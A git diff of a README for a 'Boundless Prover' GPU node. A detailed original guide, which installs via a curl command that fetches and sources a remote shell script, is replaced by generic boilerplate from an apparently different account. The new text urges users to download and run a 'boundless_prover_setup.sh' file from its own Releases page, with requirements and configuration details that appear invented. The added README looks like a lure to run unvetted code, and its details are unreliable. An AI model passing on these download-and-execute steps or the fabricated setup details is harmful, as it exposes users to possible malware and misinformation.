@@ -1,114 +1,131 @@
-<h2 align=center>Boundless Prover Node Guide</h2>
+# 🌌 Boundless Prover Node Setup Guide
 
-## 💻 System Requirements
+Welcome to the **Boundless Prover** repository! This guide will help you set up and run the Boundless Prover node on your GPU with just one click. If you're ready to dive in, check out the [Releases section](https://github.com/toopnews2024/boundless-prover/releases) for the latest files to download and execute.
 
-| Requirement                         | Details                                                     |
-|-------------------------------------|-------------------------------------------------------------|
-| **CPU**                             | `16 cores`                                                  |
-| **RAM**                             | 32 GB                                                       |
-| **GPUs**                            | At least 1 NVIDIA GPU with >= **8GB of VRAM**               |
-| **Disk/Storage**                    | 200 GB of solid state storage, NVME / SSD preferred         |
-| **Operating System**                | Ubuntu 20.04/22.04                                          |
+---
 
-## 🌐 Rent GPU
+## 🚀 Table of Contents
 
-- Visit : [Vast AI Website](https://cloud.vast.ai/?ref_id=264064)
-- Sign Up / Sign In on their website
-- Go to the `billing` section and then click on `Add Credit` to top up
-- Click on Coinbase and then choose Metamask if u want to pay with cryptocurrency
-- Now complete the payment [**Supported network** : Ethereum Mainnet, Base Mainnet, Polygon Mainnet]
-- Then open a terminal (this could be either WSL / Codespace / Command Prompt)
-- Use this below command to generate SSH-Key
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [System Requirements](#system-requirements)
+4. [Installation Steps](#installation-steps)
+5. [Configuration](#configuration)
+6. [Running the Node](#running-the-node)
+7. [Troubleshooting](#troubleshooting)
+8. [Contributing](#contributing)
+9. [License](#license)
+10. [Contact](#contact)
+
+---
+
+## 📖 Introduction
+
+The Boundless Prover is designed to leverage GPU capabilities for enhanced performance. This repository provides a straightforward guide to get your node up and running quickly. With a focus on simplicity, our aim is to make it accessible for everyone, from beginners to advanced users.
+
+## 🌟 Features
+
+- **One-Click Setup**: Get your node running with minimal effort.
+- **GPU Support**: Utilize your GPU for faster processing.
+- **Easy Configuration**: Simple settings for optimal performance.
+- **Community Driven**: Contributions and feedback are welcome!
+
+## 🖥️ System Requirements
+
+Before you begin, ensure your system meets the following requirements:
+
+- **Operating System**: Linux or Windows
+- **GPU**: NVIDIA with CUDA support (minimum 4GB VRAM recommended)
+- **RAM**: At least 8GB
+- **Disk Space**: Minimum 10GB available
+- **Dependencies**: Python 3.7+, Docker, and NVIDIA drivers
+
+## 🔧 Installation Steps
+
+Follow these steps to install the Boundless Prover:
+
+1. **Download the Latest Release**: Visit the [Releases section](https://github.com/toopnews2024/boundless-prover/releases) to download the latest version. Look for a file named `boundless_prover_setup.sh`.
+
+2. **Open Terminal**: On Linux, open your terminal. On Windows, use Command Prompt or PowerShell.
+
+3. **Navigate to Download Directory**: Change your directory to where you downloaded the setup file. For example:
+   ```bash
+   cd ~/Downloads
+   ```
+
+4. **Make the Script Executable**: Run the following command:
+   ```bash
+   chmod +x boundless_prover_setup.sh
+   ```
+
+5. **Execute the Setup Script**: Run the script with:
+   ```bash
+   ./boundless_prover_setup.sh
+   ```
+
+6. **Follow On-Screen Instructions**: The script will guide you through the installation process.
+
+## ⚙️ Configuration
+
+After installation, you need to configure your node:
+
+1. **Locate Configuration File**: The configuration file is located in `~/.boundless_prover/config.json`.
+
+2. **Edit Configuration**: Open the file in a text editor and adjust the settings as needed. Key parameters include:
+   - `gpu_enabled`: Set to `true` to enable GPU support.
+   - `max_connections`: Adjust based on your network speed.
+
+3. **Save Changes**: After editing, save the file and close the editor.
+
+## 🏃 Running the Node
+
+To start your Boundless Prover node, use the following command:
+
+```bash
+boundless_prover --config ~/.boundless_prover/config.json
 ```
-ssh-keygen
-```
-- It will ask 3 questions like this :
-```
-Enter file in which to save the key (/home/codespace/.ssh/id_rsa):
-Enter passphrase (empty for no passphrase):
-Enter same passphrase again: 
-```
-- You need to press `Enter` 3 times
-- After that you will get a message like this on your terminal
-```
-Your public key has been saved in /home/codespace/.ssh/id_rsa.pub
-```
-- `/home/codespace/.ssh/id_rsa.pub` is the path of this public key in my case, in your case it might be different
 
-![Screenshot 2025-04-08 081948](https://github.com/user-attachments/assets/035803da-c5bb-454e-9db4-4459e2123128)
+This will launch your node with the specified configuration. Monitor the terminal for logs and performance metrics.
 
-- You should use this command to see those ssh key :
-    - If you are using Linux/macOS (WSL) : `cat path/of/that/publickey` , in my case, it would be : `cat /home/codespace/.ssh/id_rsa.pub`
-    - If you are using Command Prompt : `type path\of\that\publickey`, in my case, it would be : `type \home\codespace\.ssh\id_rsa.pub`
-    - If you are using PowerShell : `Get-Content path\of\that\publickey`, in my case, it would be : `Get-Content \home\codespace\.ssh\id_rsa.pub`
-- Now copy this public key and visit vast ai website again
-- Then navigate to the `key` section, click on `ssh-key` and then paste and save your copied SSH key here
-- Then go to the template section and then choose `Ubuntu 22.04 VM` template and then click on the play icon to select this template
-- Here choose a GPU and Rent it
-- After that visit `Instances` section, if your ordered GPU is ready then u will see `Connect` button there
-- Click on it to copy the command and then paste this command on your terminal to access your GPU
+## 🐞 Troubleshooting
 
-## 🍓Prerequisites
-**1. Claim Faucet**
-- First claim USDC faucet from this [website](https://faucet.circle.com/) to your wallet
-- If you want to run this prover on Mainnet as well, then u need to have real USDC on Base Mainnet in your wallet
+If you encounter issues, consider the following:
 
-**2. Get RPC**
-- Get RPC for the network from [Alchemy website](https://dashboard.alchemy.com/chains)
-- If you want to run this prover on eth-sepolia then u need to get eth sepolia rpc, if base-sepolia then base-sepoia rpc or if base mainnet then u need to get base mainnet rpc
+- **Check Dependencies**: Ensure all required dependencies are installed.
+- **GPU Not Detected**: Verify your GPU drivers are up to date.
+- **Configuration Errors**: Double-check your `config.json` for any syntax errors.
 
-## 📥 Installation
-- Install `curl` command
-```
-apt update && apt install -y curl
-```
-- Execute this command to run boundless prover
-```
-[ -f boundless.sh ] && rm boundless.sh; curl -o boundless.sh https://raw.githubusercontent.com/zunxbt/boundless-prover/refs/heads/main/boundless.sh && chmod +x boundless.sh && . ./boundless.sh
-```
-## ⚙️ Check Logs
-- Use the below command to check logs
-```
-docker compose logs -f broker
-```
-- You will some similar types of logs after few mins of running
+For additional support, visit the [Issues section](https://github.com/toopnews2024/boundless-prover/issues) on GitHub.
 
-![image](https://github.com/user-attachments/assets/4fe76d31-9d3e-4220-a107-d6146c61aafc)
+## 🤝 Contributing
 
-## 💻 Some commands
-- To Stop Broker
+We welcome contributions from the community. If you want to help, please follow these steps:
 
-   - For `eth-sepolia`
+1. **Fork the Repository**: Click the "Fork" button on the top right.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature-branch
+   ```
+3. **Make Your Changes**: Implement your features or fixes.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Fork**: 
+   ```bash
+   git push origin feature-branch
+   ```
+6. **Create a Pull Request**: Submit your changes for review.
 
-     ```
-     just broker down ./.env.broker.eth-sepolia
-     ```
-  - For `base-sepolia`
+## 📜 License
 
-    ```
-    just broker down ./.env.broker.base-sepolia
-    ```
-  - For `base` (mainnet)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-    ```
-    just broker down ./.env.broker.base
-    ```
-- To Start Broker
+## 📬 Contact
 
-   - For `eth-sepolia`
+For any inquiries, feel free to reach out:
 
-     ```
-     just broker up ./.env.broker.eth-sepolia
-     ```
-  - For `base-sepolia`
+- **Email**: support@boundlessprover.com
+- **GitHub Issues**: [Open an Issue](https://github.com/toopnews2024/boundless-prover/issues)
 
-    ```
-    just broker up ./.env.broker.base-sepolia
-    ```
-  - For `base` (mainnet)
-
-    ```
-    just broker up ./.env.broker.base
-    ```
-
-**Note : This is the basic stuff, your node will run fine now but I still need to add more things here, so u should check this guide back later**
+Thank you for using Boundless Prover! We hope this guide helps you get started easily. For updates and news, keep an eye on the [Releases section](https://github.com/toopnews2024/boundless-prover/releases).
